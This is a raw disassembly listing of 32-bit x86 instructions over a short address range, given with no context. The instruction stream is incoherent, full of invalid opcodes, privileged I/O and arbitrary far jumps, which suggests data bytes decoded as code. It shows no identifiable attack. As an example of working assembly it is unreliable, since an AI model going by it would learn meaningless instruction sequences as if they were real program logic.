  42207d:	scas   eax,DWORD PTR es:[edi]
  42207e:	cmc    
  42207f:	repnz add BYTE PTR [eax],al
	...
  42208e:	cmp    BYTE PTR [edx-0x6a],ch
  422091:	add    edx,esi
  422093:	(bad)  
  422094:	mov    ebp,0xdb4ef67b
  422099:	out    0x29,eax
  42209b:	bswap  ebp
  42209d:	aas    
  42209e:	xlat   BYTE PTR ds:[ebx]
  42209f:	xlat   BYTE PTR ds:[ebx]
  4220a0:	add    DWORD PTR [eax],eax
  4220a2:	pop    edx
  4220a3:	add    BYTE PTR [eax],al
  4220a5:	add    BYTE PTR [edi+0x3d],cl
  4220a8:	push   edi
  4220a9:	xlat   BYTE PTR ds:[ebx]
  4220aa:	mov    eax,fs:0x7e0f901e
  4220b0:	mov    DWORD PTR [esi],ebx
  4220b2:	xor    al,0x63
  4220b4:	(bad)  
  4220b5:	out    dx,al
  4220b6:	lea    esp,[esi]
  4220b8:	iret   
  4220b9:	adc    DWORD PTR [edx],0x2cae2a3b
  4220bf:	rcr    BYTE PTR [edx+0x54],0x6a
  4220c3:	push   edx
  4220c4:	shl    BYTE PTR [ebx-0x37],cl
  4220c7:	in     al,0x47
  4220c9:	and    dl,ch
  4220cb:	adc    ch,cl
  4220cd:	(bad)  [edi]
  4220cf:	int3   
  4220d0:	push   ecx
  4220d1:	or     bl,BYTE PTR [eax-0x6]
  4220d4:	mov    esp,0x30c9afd4
  4220d9:	test   al,0x62
  4220db:	and    BYTE PTR [ebx-0x148cb5a2],dl
  4220e1:	sbb    al,0x1f
  4220e3:	lahf   
  4220e4:	jnp    0x422094
  4220e6:	jmp    edx
  4220e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220e9:	ret    0xb219
  4220ec:	jne    0x4220b9
  4220ee:	out    dx,al
  4220ef:	imul   esp,DWORD PTR [ecx],0x4b
  4220f2:	add    BYTE PTR [edi-0x26e16d82],ch
  4220f8:	mov    al,0xfd
  4220fa:	mov    ecx,0xfba149c8
  4220ff:	xchg   ebp,eax
	...
  42210c:	add    BYTE PTR [eax],al
  42210e:	jmp    0x7a729bcc
  422113:	repz jmp 0x42210f
  422116:	fimul  DWORD PTR [esp+eax*2+0x6c]
  42211a:	xor    DWORD PTR [ecx],ebp
  42211c:	jmp    0x5a00:0x1d831d5
  422123:	add    BYTE PTR [eax],al
  422125:	add    BYTE PTR [ebx-0x5b],dh
  422128:	fsubr  QWORD PTR [esi+ecx*1+0x311e28f5]
  42212f:	aad    0xa7
  422131:	and    edx,0x4a
  422134:	dec    esi
  422135:	int    0x49
  422137:	cli    
  422138:	inc    eax
  422139:	or     DWORD PTR [edx+0x4a],ebp
  42213c:	out    dx,al
  42213d:	xor    DWORD PTR [ebp-0x5a21f557],esp
  422143:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422144:	push   cs
  422145:	pop    eax
  422146:	mov    ecx,0xa66a0ee1
  42214b:	aaa    
  42214c:	cmp    ebx,eax
  42214e:	jnp    0x4220d5
  422150:	jns    0x422112
  422152:	mov    al,0xe
  422154:	mov    ebx,ecx
  422156:	push   es
  422157:	icebp  
  422158:	jl     0x42219b
  42215a:	push   eax
  42215b:	add    esi,DWORD PTR [eax]
  42215d:	in     al,0xee
  42215f:	call   0x2958:0x2ae84748
  422166:	adc    BYTE PTR [ebp-0x5b],bl
  422169:	xchg   ebx,eax
  42216a:	mov    BYTE PTR [ecx],0x3f
  42216d:	lahf   
  42216e:	lea    eax,[esi+0x5d7b35a3]
  422174:	mov    ds:0xe04744dd,eax
  422179:	sub    DWORD PTR [ebx-0x4ffc5a30],ebp
  42217f:	cli    
	...
  42218c:	add    BYTE PTR [eax],al
  42218e:	pop    ebx
  42218f:	inc    ecx
  422190:	pop    ebx
  422191:	iret   
  422192:	pop    ebx
  422193:	(bad)  
  422195:	aad    0xf
  422197:	ss dec esp
  422199:	dec    esi
  42219a:	out    dx,eax
  42219b:	pop    bx
  42219d:	mov    al,ds:0x1d88b
  4221a2:	pop    edx
  4221a3:	add    BYTE PTR [eax],al
  4221a5:	add    BYTE PTR [eax*1-0x5039d0c],ah
  4221ac:	dec    ebp
  4221ad:	es call 0x9999:0xdb313a41
  4221b5:	nop
  4221b6:	inc    BYTE PTR [edi-0x1]
  4221b9:	sub    bh,dh
  4221bb:	sub    al,0x9f
  4221bd:	nop
  4221be:	xchg   edx,eax
  4221bf:	pop    esi
  4221c0:	int    0x39
  4221c2:	jb     0x4221b8
  4221c4:	lea    edi,[ebp-0x6]
  4221c7:	inc    edx
  4221c8:	xchg   DWORD PTR [edi+0x41],eax
  4221cb:	or     BYTE PTR [edi],ah
  4221cd:	mov    esp,0x27af7eb4
  4221d2:	pusha  
  4221d3:	stos   DWORD PTR es:[edi],eax
  4221d4:	ins    BYTE PTR es:[edi],dx
  4221d5:	xor    eax,0x7f0d6a50
  4221da:	cdq    
  4221db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221dc:	push   eax
  4221dd:	in     al,0x70
  4221df:	and    ebx,DWORD PTR [ecx-0x43547d8b]
  4221e5:	(bad)  
  4221e6:	aam    0xc4
  4221e8:	push   ebp
  4221e9:	push   eax
  4221ea:	jbe    0x422197
  4221ec:	mov    bl,0x9
  4221ee:	mov    cl,0x66
  4221f0:	ins    BYTE PTR es:[edi],dx
  4221f1:	pop    ecx
  4221f2:	mov    eax,ds:0xa6fb1b48
  4221f7:	popf   
  4221f8:	cdq    
  4221f9:	mov    esi,0xb373cd60
  4221fe:	sbb    DWORD PTR [ebx+0x0],0x0
	...
  42220d:	add    BYTE PTR [ebx+0x7f3c6585],bl
  422213:	cld    
  422214:	(bad)  [edi-0x65be08a1]
  42221a:	int3   
  42221b:	stc    
  42221c:	nop
  42221d:	mov    ch,ah
  42221f:	fadd   DWORD PTR [ecx]
  422221:	add    BYTE PTR [edx+0x0],bl
  422224:	add    BYTE PTR [eax],al
  422226:	mov    bl,0x8f
  422228:	sub    DWORD PTR [edx+0x27],edx
  42222b:	jle    0x422205
  42222d:	dec    edi
  42222e:	out    dx,eax
  42222f:	dec    esi
  422230:	inc    edi
  422231:	pop    ecx
  422232:	lahf   
  422233:	push   ecx
  422235:	sub    al,al
  422237:	pop    es
  422238:	mov    esi,0xb5f7f001
  42223d:	stc    
  42223e:	scas   al,BYTE PTR es:[edi]
  42223f:	outs   dx,DWORD PTR ds:[esi]
  422240:	stos   BYTE PTR es:[edi],al
  422241:	out    dx,al
  422242:	imul   esi,DWORD PTR [edi+esi*4],0x78
  422246:	fisub  DWORD PTR [ebx+0x64]
  422249:	in     al,0xcd
  42224b:	pop    ds
  42224c:	mov    ecx,0x2334c7e2
  422251:	popa   
  422252:	test   eax,0xfdfde372
  422257:	nop
  422258:	push   ebp
  422259:	std    
  42225a:	and    ah,ah
  42225c:	lea    edi,[ecx+0xf]
  42225f:	push   ebp
  422260:	and    ah,BYTE PTR [esp+eiz*2]
  422263:	add    BYTE PTR [eax+0x13],0x21
  422267:	sti    
  422268:	shl    BYTE PTR [ecx],0xa
  42226b:	aas    
  42226c:	aam    0x20
  42226e:	pop    es
  42226f:	and    al,0xcb
  422271:	and    ch,ah
  422273:	dec    edx
  422274:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422275:	test   al,0x84
  422277:	mov    cs,WORD PTR [ecx-0x7e]
  42227a:	push   0xf9dbd0d5
  42227f:	xchg   ebx,eax
	...
  42228c:	add    BYTE PTR [eax],al
  42228e:	outs   dx,BYTE PTR ds:[esi]
  42228f:	jae    0x422281
  422291:	retf   0xcbfd
  422294:	jle    0x42228d
  422296:	repz xor eax,0x4298ce9
  42229c:	jge    0x422292
  42229e:	aas    
  42229f:	fld    DWORD PTR [ecx]
  4222a1:	add    BYTE PTR [edx+0x0],bl
  4222a4:	add    BYTE PTR [eax],al
  4222a6:	shl    BYTE PTR [ecx],0xdd
  4222a9:	shl    bh,1
  4222ab:	xchg   ebp,eax
  4222ac:	pop    ecx
  4222ad:	test   DWORD PTR [esi-0x71],eax
  4222b0:	pop    ds
  4222b1:	xor    BYTE PTR [ebx+0x613d5ce8],ch
  4222b7:	outs   dx,DWORD PTR ds:[esi]
  4222b8:	add    eax,edx
  4222ba:	lea    edx,[ebx+0x47]
  4222bd:	lea    edi,ds:0x2259678b
  4222c3:	sbb    DWORD PTR [ebp+0x47],ebx
  4222c6:	jecxz  0x422251
  4222c8:	or     eax,0x39de9b9a
  4222cd:	add    DWORD PTR [edx+0x3],ebp
  4222d0:	or     ah,dh
  4222d2:	neg    ebp
  4222d4:	xchg   edx,eax
  4222d5:	cwde   
  4222d6:	pop    esp
  4222d7:	sub    DWORD PTR [ecx-0x6a6dfbf3],edi
  4222dd:	dec    ecx
  4222de:	mov    dh,0x4e
  4222e0:	dec    esi
  4222e1:	lock scas eax,DWORD PTR es:[edi]
  4222e3:	mov    esi,0xefcdb9bb
  4222e8:	outs   dx,DWORD PTR fs:[esi]
  4222ea:	fs push ss
  4222ec:	hlt    
  4222ed:	dec    eax
  4222ee:	xchg   esi,eax
  4222ef:	mov    DWORD PTR [ebp-0x2c],edx
  4222f2:	mov    ebx,0x99189ef7
  4222f7:	cmp    bh,ah
  4222f9:	aad    0xba
  4222fb:	cmp    eax,0xe41fa32b
	...
  42230c:	add    BYTE PTR [eax],al
  42230e:	cmc    
  42230f:	adc    al,0xae
  422311:	adc    ebp,edi
  422313:	mov    ebx,0x84e6f6fd
  422318:	lds    ebp,FWORD PTR [edx-0x2b7ca23e]
  42231e:	cdq    
  42231f:	fld    DWORD PTR [ecx]
  422321:	add    BYTE PTR [edx+0x0],bl
  422324:	add    BYTE PTR [eax],al
  422326:	sub    BYTE PTR [ecx-0x7c789eec],dl
  42232c:	mov    bh,0x21
  42232e:	daa    
  42232f:	pushf  
  422330:	sub    BYTE PTR es:[ecx],0xee
  422334:	xchg   DWORD PTR [ecx],edx
  422336:	dec    ebx
  422337:	sahf   
  422338:	hlt    
  422339:	adc    al,BYTE PTR [edi+0x4d]
  42233c:	(bad)  
  42233d:	in     eax,0xe8
  42233f:	push   edi
  422340:	retf   
  422341:	cdq    
  422342:	mov    al,ds:0x6fbc0279
  422347:	cmp    dh,BYTE PTR [edx]
  422349:	push   ebx
  42234a:	inc    esp
  42234b:	jb     0x422392
  42234d:	int3   
  42234e:	ret    0xf12b
  422351:	jge    0x422315
  422353:	mov    fs,WORD PTR [esi]
  422355:	and    DWORD PTR es:[ebp+0x42],ecx
  422359:	lods   eax,DWORD PTR ds:[esi]
  42235a:	or     eax,DWORD PTR ds:0x3b229836
  422360:	out    0xc3,eax
  422362:	or     BYTE PTR [esi],dh
  422364:	popa   
  422365:	ins    DWORD PTR es:[edi],dx
  422366:	ss jo  0x4223bf
  422369:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42236a:	test   DWORD PTR [edx-0x7c446681],ecx
  422370:	lods   al,BYTE PTR ds:[esi]
  422371:	les    edx,FWORD PTR [eax-0x38]
  422374:	xchg   ebp,eax
  422375:	fndisi(8087 only) 
  422377:	mov    cl,0xf5
  422379:	mov    ds:0x564159dd,al
  42237e:	mov    esi,0x8f
	...
  42238b:	add    BYTE PTR [eax],al
  42238d:	add    BYTE PTR [ebx],bh
  42238f:	mov    cl,0x57
  422391:	lock fcomip st,st(6)
  422394:	mov    edi,0xbb1c16fb
  422399:	ror    BYTE PTR [ecx-0xc19cc62],0xd9
  4223a0:	add    DWORD PTR [eax],eax
  4223a2:	pop    edx
  4223a3:	add    BYTE PTR [eax],al
  4223a5:	add    al,dl
  4223a7:	jnp    0x4223d2
  4223a9:	xor    eax,0xbfc05385
  4223ae:	ja     0x42240c
  4223b0:	popf   
  4223b1:	mov    ds:0x184044ba,al
  4223b6:	add    cl,BYTE PTR [esi]
  4223b8:	lock fsubr QWORD PTR [edi-0x3733420e]
  4223bf:	pop    esp
  4223c0:	dec    edi
  4223c1:	int3   
  4223c2:	aas    
  4223c3:	scas   al,BYTE PTR es:[edi]
  4223c4:	loop   0x42242d
  4223c6:	cmp    ebx,DWORD PTR [ebp-0x43494e19]
  4223cc:	(bad)  
  4223cd:	stc    
  4223ce:	int3   
  4223cf:	jl     0x422388
  4223d1:	jg     0x4223d1
  4223d3:	sahf   
  4223d4:	and    al,0x8c
  4223d6:	push   ss
  4223d7:	jmp    0x8da3:0x2a7ab3e3
  4223de:	test   eax,0xca43f5b7
  4223e3:	push   ecx
  4223e4:	sti    
  4223e5:	mov    WORD PTR [esi+0x69c3e3f8],?
  4223eb:	mov    bl,0x7
  4223ed:	sbb    DWORD PTR [ebx+eax*4],edi
  4223f0:	iret   
  4223f1:	out    dx,eax
  4223f2:	jb     0x422404
  4223f4:	ret    
  4223f5:	pop    ecx
  4223f6:	xor    DWORD PTR [ebp+0x7f4a14f3],0xffffffcc
  4223fd:	out    dx,al
  4223fe:	or     ecx,DWORD PTR [ecx+0x0]
	...
  42240d:	add    ah,dl
  42240f:	sqrtps xmm6,xmm0
  422412:	(bad)  
  422414:	cmc    
  422415:	das    
  422416:	sbb    BYTE PTR [eax],cl
  422418:	xchg   ebx,eax
  422419:	iret   
  42241a:	das    
  42241b:	ds repz push 0x1da4d
  422422:	pop    edx
  422423:	add    BYTE PTR [eax],al
  422425:	add    BYTE PTR [esi],cl
  422427:	jne    0x42240b
  422429:	cs das 
  42242b:	idiv   BYTE PTR [edx-0x4]
  42242e:	or     eax,0x11641b0d
  422433:	adc    bh,BYTE PTR [ebx-0x73]
  422436:	mov    ch,0x8d
  422438:	mov    al,0x3f
  42243a:	iret   
  42243b:	inc    edi
  42243c:	shl    BYTE PTR ds:0xead5c7f,cl
  422442:	inc    ebp
  422443:	loop   0x4223cf
  422445:	push   cs
  422446:	mov    ecx,0xbfcd40b2
  42244b:	xor    DWORD PTR [edx-0x7fe89526],edi
  422451:	cld    
  422452:	(bad)
  422455:	lods   eax,DWORD PTR ds:[esi]
  422456:	sbb    ch,BYTE PTR [esi+0x1b0b47c2]
  42245c:	retf   
  42245d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42245e:	dec    edi
  42245f:	in     al,0xcb
  422461:	mov    edi,0xd65855b1
  422466:	add    al,0x13
  422468:	test   BYTE PTR [ebp-0x3d78c4dd],0x75
  42246f:	cmp    al,0xac
  422471:	add    al,0x72
  422473:	sub    eax,0x7b87f114
  422478:	jae    0x4224a7
  42247a:	je     0x422465
  42247c:	mov    WORD PTR [ecx+0x722f],es
	...
  42248e:	int    0x2d
  422490:	xchg   ebp,eax
  422491:	inc    ebx
  422492:	cmc    
  422493:	sti    
  422494:	fild   QWORD PTR [edi-0x5bdf5fa9]
  42249a:	sahf   
  42249b:	daa    
  42249c:	mov    al,0x54
  42249e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42249f:	fiadd  DWORD PTR [ecx]
  4224a1:	add    BYTE PTR [edx+0x0],bl
  4224a4:	add    BYTE PTR [eax],al
  4224a6:	push   esi
  4224a7:	jb     0x4224f5
  4224a9:	jno    0x4224af
  4224ab:	pop    esi
  4224ac:	jnp    0x4224b7
  4224ae:	and    eax,0x1ce19f94
  4224b3:	hlt    
  4224b4:	rcr    dh,cl
  4224b6:	and    eax,0x258f4892
  4224bb:	jp     0x42252c
  4224bd:	loop   0x42250b
  4224bf:	jge    0x4224b7
  4224c1:	cmp    al,0x36
  4224c3:	mov    BYTE PTR [ebx+0x6fa0ff7f],al
  4224c9:	fsub   DWORD PTR [ebx]
  4224cb:	std    
  4224cc:	fs or  al,0x7d
  4224cf:	loop   0x42250a
  4224d1:	or     dh,BYTE PTR [eax-0x7d]
  4224d4:	test   BYTE PTR [edx],cl
  4224d6:	mov    esp,0x20aeea27
  4224db:	out    0x95,eax
  4224dd:	push   esp
  4224de:	int3   
  4224df:	mov    DWORD PTR [ebx-0x7b7958fa],ecx
  4224e5:	scas   eax,DWORD PTR es:[edi]
  4224e6:	aaa    
  4224e7:	push   ss
  4224e8:	xchg   ebx,eax
  4224e9:	jmp    0x4140:0xb56ceb7
  4224f0:	mov    ebx,DWORD PTR [eax-0x35]
  4224f3:	push   cs
  4224f4:	popf   
  4224f5:	push   0xffffffd5
  4224f7:	ja     0x422569
  4224f9:	repnz adc ebx,0xe9ccd6c1
	...
  42250c:	add    BYTE PTR [eax],al
  42250e:	adc    esp,DWORD PTR [edi+eiz*8+0xb]
  422512:	test   DWORD PTR [ebx-0xce58301],0xbce84cfc
  42251c:	cld    
  42251d:	test   eax,0x1db01
  422522:	pop    edx
  422523:	add    BYTE PTR [eax],al
  422525:	add    BYTE PTR [ebp+esi*2+0x68],cl
  422529:	add    eax,0x38a21a5f
  42252e:	or     eax,0x9c1b6df8
  422533:	retf   0x2e67
  422536:	aas    
  422537:	dec    ecx
  422538:	cmc    
  422539:	ins    BYTE PTR es:[edi],dx
  42253a:	pop    ebp
  42253b:	add    eax,0xb18c7ee7
  422540:	or     al,BYTE PTR [ebx-0x4faa19c4]
  422546:	push   eax
  422547:	xor    ecx,ebx
  422549:	xor    DWORD PTR ds:0x2b6d8841,esp
  42254f:	(bad)  
  422550:	popf   
  422551:	mov    ebp,0x5d699497
  422556:	push   ds
  422557:	push   ebp
  422558:	jmp    0x9dc21eb5
  42255d:	popa   
  42255e:	xor    BYTE PTR [edi-0x1750da32],al
  422564:	rcl    DWORD PTR [ecx],0xb
  422567:	lahf   
  422568:	mov    eax,ds:0xd8df5e3b
  42256d:	mov    eax,ds:0xc24bdba6
  422572:	add    DWORD PTR [esp+edi*8-0x54],0x4e
  422577:	xchg   edi,eax
  422578:	lods   eax,DWORD PTR ds:[esi]
  422579:	push   esp
  42257a:	sub    DWORD PTR [esi],ebp
  42257c:	std    
  42257d:	cdq    
  42257e:	xchg   ebp,eax
  42257f:	mov    DWORD PTR [eax],0x0
	...
  42258d:	add    BYTE PTR [edi],ah
  42258f:	push   ecx
  422590:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  42259a:	ret    0x60e3
  42259d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42259e:	pop    ebx
  42259f:	fild   DWORD PTR [ecx]
  4225a1:	add    BYTE PTR [edx+0x0],bl
  4225a4:	add    BYTE PTR [eax],al
  4225a6:	les    ecx,FWORD PTR [edi+0x1]
  4225a9:	lea    ecx,[edi+0x51]
  4225ac:	pop    ebx
  4225ad:	push   cs
  4225ae:	rcr    DWORD PTR [ecx],cl
  4225b0:	mov    ebx,0xcc178fc
  4225b5:	sbb    DWORD PTR [eax-0x774831a9],ebx
  4225bb:	jo     0x422633
  4225bd:	pop    ss
  4225be:	sbb    bl,BYTE PTR [eax-0x1a]
  4225c1:	pop    esp
  4225c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225c3:	pusha  
  4225c4:	std    
  4225c5:	les    ebx,FWORD PTR [edx+0x4740e852]
  4225cb:	icebp  
  4225cc:	fsubr  QWORD PTR [ebx-0x78204b63]
  4225d2:	ins    BYTE PTR es:[edi],dx
  4225d3:	xchg   ebx,eax
  4225d4:	dec    edx
  4225d5:	stos   DWORD PTR es:[edi],eax
  4225d6:	fstp   TBYTE PTR [eax+0x22]
  4225d9:	call   0x1106:0x5b4b0a63
  4225e0:	retf   
  4225e1:	sub    DWORD PTR [ebx+0x27d9c8fc],ebx
  4225e7:	clc    
  4225e8:	out    0x41,eax
  4225ea:	popf   
  4225eb:	(bad)  [ebp+0x4ef0e900]
  4225f1:	stc    
  4225f2:	and    ah,BYTE PTR [ebx-0x1b]
  4225f5:	test   BYTE PTR [edx],dh
  4225f7:	ror    BYTE PTR [eax],0xc8
  4225fa:	sub    cl,dl
  4225fc:	mov    ds:0xc3e96d,al
	...
  42260d:	add    BYTE PTR [esi],dh
  42260f:	add    dl,BYTE PTR [ebp+0xc]
  422612:	jne    0x422673
  422614:	jg     0x422650
  422616:	clc    
  422617:	cs aas 
  422619:	push   0x8f510e4a
  42261e:	mov    bl,0xce
  422620:	add    DWORD PTR [eax],eax
  422622:	pop    edx
  422623:	add    BYTE PTR [eax],al
  422625:	add    BYTE PTR [ecx-0x5f],ah
  422628:	icebp  
  422629:	loopne 0x4225f7
  42262b:	push   esi
  42262c:	stos   DWORD PTR es:[edi],eax
  42262d:	rcl    DWORD PTR [edi+0x23],0xb9
  422631:	push   es
  422632:	dec    ebp
  422633:	fcom   DWORD PTR ds:0x6229bf
  422639:	(bad)  
  42263a:	xchg   ecx,eax
  42263b:	int    0x23
  42263d:	stos   DWORD PTR es:[edi],eax
  42263e:	hlt    
  42263f:	jmp    0x4225d3
  422641:	mov    bl,0x4a
  422643:	icebp  
  422644:	sub    eax,0x50c2cf5c
  422649:	call   0x4a97bcd
  42264e:	mov    esp,0xfc09ea0f
  422653:	mov    eax,0x83b83101
  422658:	xchg   edx,eax
  422659:	imul   ebp,DWORD PTR [esi+0x5],0x31c62092
  422660:	lods   eax,DWORD PTR ds:[esi]
  422661:	sahf   
  422662:	stos   DWORD PTR es:[edi],eax
  422663:	dec    esi
  422664:	bound  eax,QWORD PTR [ecx-0x197dd0b4]
  42266a:	mov    eax,ds:0x864be582
  42266f:	cdq    
  422670:	jg     0x422686
  422672:	lea    edi,[esp+edi*8-0x3fd00e0e]
  422679:	jnp    0x42261c
  42267b:	fwait
  42267c:	rol    esp,0x4d
  42267f:	pop    ecx
	...
  42268c:	add    BYTE PTR [eax],al
  42268e:	or     BYTE PTR [ecx-0x404c48e],dh
  422694:	dec    ecx
  422695:	mov    bl,0x94
  422697:	je     0x422670
  422699:	call   0xcf0d:0xe827e3aa
  4226a0:	add    DWORD PTR [eax],eax
  4226a2:	pop    edx
  4226a3:	add    BYTE PTR [eax],al
  4226a5:	add    ah,ch
  4226a7:	imul   edx,DWORD PTR gs:[ecx+0x1d],0x845bb1c8
  4226af:	popf   
  4226b0:	(bad)  
  4226b1:	dec    ebx
  4226b2:	ins    BYTE PTR es:[edi],dx
  4226b3:	ins    DWORD PTR es:[edi],dx
  4226b4:	(bad)  
  4226b5:	shl    BYTE PTR [edi*2+0x515d15d3],1
  4226bc:	mov    cl,0x1f
  4226be:	repnz sti 
  4226c0:	dec    esi
  4226c1:	fmul   QWORD PTR [ecx+0x64b3195]
  4226c7:	retf   0xfae3
  4226ca:	stc    
  4226cb:	popfw  
  4226cd:	add    edx,esi
  4226cf:	pop    es
  4226d0:	pop    edx
  4226d1:	xchg   edx,eax
  4226d2:	and    ch,BYTE PTR [bx+0x7d]
  4226d6:	lock int3 
  4226d8:	jg     0x422715
  4226da:	sub    BYTE PTR [edi],cl
  4226dc:	inc    esi
  4226dd:	add    ah,dh
  4226df:	inc    esp
  4226e0:	sbb    DWORD PTR [ebp+0x1d6de387],esp
  4226e6:	push   0xccfcaf3d
  4226eb:	lock push ds
  4226ed:	inc    ebp
  4226ee:	ror    DWORD PTR [edx+eax*4],cl
  4226f1:	dec    esp
  4226f2:	and    eax,0xa877abe5
  4226f7:	std    
  4226f8:	pop    eax
  4226f9:	test   al,0xa9
  4226fb:	adc    ecx,esp
  4226fd:	or     esi,esi
  4226ff:	sbb    eax,0x0
	...
  42270c:	add    BYTE PTR [eax],al
  42270e:	fist   WORD PTR [ebx-0x4e]
  422711:	dec    edi
  422712:	mov    esi,0x67d3ffef
  422717:	xchg   ecx,edi
  422719:	adc    al,0xa8
  42271b:	mov    ds:0xcf672c71,al
  422720:	add    DWORD PTR [eax],eax
  422722:	pop    edx
  422723:	add    BYTE PTR [eax],al
  422725:	add    BYTE PTR [ebp-0x6d03c1eb],al
  42272b:	loope  0x422782
  42272d:	(bad)  
  42272e:	js     0x422796
  422730:	pop    ebx
  422731:	sbb    al,0xb7
  422733:	push   edi
  422734:	je     0x42272e
  422736:	hlt    
  422737:	jne    0x4227b1
  422739:	lds    esi,FWORD PTR [esi]
  42273b:	cmp    BYTE PTR [ecx+0x7381d41b],ah
  422741:	and    ch,dh
  422743:	push   eax
  422744:	into   
  422745:	xchg   edx,eax
  422746:	pop    ebp
  422748:	xchg   esi,eax
  422749:	clc    
  42274a:	inc    esp
  42274b:	cmp    bh,dl
  42274d:	dec    edx
  42274e:	inc    eax
  42274f:	les    esi,FWORD PTR [esi]
  422751:	jle    0x42271b
  422753:	or     BYTE PTR [eax+esi*4-0x1492af8b],ch
  42275a:	xchg   ecx,eax
  42275b:	jb     0x422711
  42275d:	fnstsw WORD PTR [eax]
  42275f:	leave  
  422760:	call   0x97027b43
  422765:	mov    ebx,eax
  422767:	mov    esp,0xfb6519d0
  42276c:	jg     0x4227da
  42276e:	es dec ebp
  422770:	dec    esi
  422771:	push   ss
  422772:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422773:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422774:	push   edx
  422775:	retf   
  422776:	jne    0x42278c
  422778:	loope  0x42278f
  42277a:	xor    al,BYTE PTR [ebx-0x5efda479]
	...
  42278c:	add    BYTE PTR [eax],al
  42278e:	xchg   DWORD PTR [ebx+edx*8],ecx
  422791:	fcmovu st,st(3)
  422793:	fisttp WORD PTR [edi+0x640ccb5d]
  422799:	push   ss
  42279a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42279b:	pop    edx
  42279c:	pop    esi
  42279d:	mov    esi,0x1cfc1
  4227a2:	pop    edx
  4227a3:	add    BYTE PTR [eax],al
  4227a5:	add    BYTE PTR ds:0x4b3c917d,dl
  4227ab:	test   eax,0x647e840
  4227b0:	mov    esp,0x37404d49
  4227b5:	dec    DWORD PTR [esi-0x11]
  4227b8:	jmp    0xd4e4f962
  4227bd:	or     BYTE PTR [ecx+0x679e6f9c],ch
  4227c3:	and    edi,DWORD PTR [ebx+ebx*1+0x59a4e62a]
  4227ca:	xor    DWORD PTR [edx+0x142fca8d],esi
  4227d0:	adc    edx,DWORD PTR [edx-0x56]
  4227d3:	add    esi,DWORD PTR [eax-0x70d21f67]
  4227d9:	push   es
  4227da:	push   0x53
  4227dc:	dec    edi
  4227dd:	pushf  
  4227de:	mov    dh,0x29
  4227e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227e2:	aad    0x19
  4227e4:	call   DWORD PTR [ebx-0x5d]
  4227e7:	and    DWORD PTR [edi-0x57],edx
  4227ea:	das    
  4227eb:	and    eax,0x28ad3b55
  4227f0:	sub    eax,0x53118410
  4227f5:	sbb    eax,0xf69b66bb
  4227fa:	dec    edi
  4227fb:	jne    0x4227b1
  4227fd:	pusha  
  4227fe:	xchg   esi,eax
  4227ff:	and    eax,DWORD PTR [eax]
	...
  42280d:	add    BYTE PTR [edi-0x28db29d],bl
  422813:	jle    0x4227d4
  422815:	out    dx,eax
  422816:	sbb    edi,esp
  422818:	mov    BYTE PTR [esp+ebp*1+0x1b322584],dh
  42281f:	rol    BYTE PTR [ecx],1
  422821:	add    BYTE PTR [edx+0x0],bl
  422824:	add    BYTE PTR [eax],al
  422826:	inc    esi
  422827:	mov    eax,0xe65a3a2
  42282c:	cmp    eax,ebx
  42282e:	push   edi
  42282f:	mov    edx,0xefe10c60
  422834:	je     0x4228a4
  422836:	int    0x67
  422838:	xchg   edi,eax
  422839:	mov    bl,0xe6
  42283b:	test   al,0xd3
  42283d:	add    DWORD PTR [edx+0x24d65e50],esp
  422843:	mov    ds:0xea48012a,al
  422848:	mov    edx,0x11b2679a
  42284d:	aad    0x76
  42284f:	xchg   BYTE PTR [esi+esi*2+0x65],cl
  422853:	mov    DWORD PTR [edi+ebp*2-0x5a051e5b],0xe2595e16
  42285e:	or     BYTE PTR [edx],0x29
  422861:	sti    
  422862:	addr16 stc 
  422864:	call   0xc2d8cde3
  422869:	jns    0x422880
  42286b:	sub    BYTE PTR [ebx-0x44],cl
  42286e:	lock pop ds
  422870:	jae    0x422864
  422872:	jae    0x42283d
  422874:	ret    0x11fb
  422877:	(bad)  
  422878:	jmp    0x422886
  42287a:	mov    dl,0x7
  42287c:	jb     0x42283b
  42287e:	fs js  0x422881
	...
  42288d:	add    BYTE PTR [eax+0x23],dh
  422890:	and    eax,0x7c6f7769
  422895:	cmp    esp,DWORD PTR [eax+0x74bcee1c]
  42289b:	ja     0x4228e4
  42289d:	push   eax
  42289e:	jne    0x422870
  4228a0:	add    DWORD PTR [eax],eax
  4228a2:	pop    edx
  4228a3:	add    BYTE PTR [eax],al
  4228a5:	add    BYTE PTR ds:0x5ca1719f,cl
  4228ab:	jle    0x4228aa
  4228ad:	push   ecx
  4228ae:	addr16 xchg ebp,eax
  4228b0:	int    0x9d
  4228b2:	fist   DWORD PTR [edi+0x17]
  4228b5:	inc    edi
  4228b6:	inc    eax
  4228b7:	(bad)  
  4228b8:	out    dx,al
  4228b9:	mov    ecx,0xa7adbc47
  4228be:	lock imul ebp,DWORD PTR [ecx],0x63adab77
  4228c5:	fild   WORD PTR [ecx]
  4228c7:	pop    edi
  4228c8:	inc    ebp
  4228c9:	dec    edi
  4228ca:	pop    ecx
  4228cb:	dec    esp
  4228cc:	jecxz  0x4228e4
  4228ce:	jg     0x422899
  4228d0:	xchg   DWORD PTR [edx+0xd95af5d],ebx
  4228d6:	(bad)  
  4228d7:	lahf   
  4228d8:	inc    edx
  4228d9:	ror    esi,cl
  4228db:	cmp    DWORD PTR [ebx],ecx
  4228dd:	and    dh,BYTE PTR [ebx-0x7194432a]
  4228e3:	xor    al,0x9e
  4228e5:	in     eax,0xb2
  4228e7:	lahf   
  4228e8:	jns    0x4228ab
  4228ea:	cmc    
  4228eb:	fucom  st(3)
  4228ed:	jg     0x42289a
  4228ef:	imul   esp,DWORD PTR [edx-0x71],0xe60add3c
  4228f6:	hlt    
  4228f7:	mov    ds:0x61c5b534,eax
